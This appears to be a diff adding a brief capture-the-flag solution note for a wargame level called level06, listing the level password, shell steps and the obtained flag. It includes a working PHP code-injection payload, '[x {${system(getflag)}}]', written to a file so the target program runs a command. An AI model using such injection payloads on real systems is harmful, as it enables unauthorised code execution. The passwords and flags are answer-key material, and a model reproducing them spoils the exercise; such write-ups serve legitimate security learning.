@@ -1,0 +1,8 @@
+level06 : viuaaale9huek52boumoomioc
+Process :
+    - ls -la
+    - ./level06
+    - cat level06.php
+    - echo '[x {${system(getflag)}}]' > /tmp/res
+    - ./level06 /tmp/res
+    - get the flag = wiok45aaoguiboiki2tuin6ub
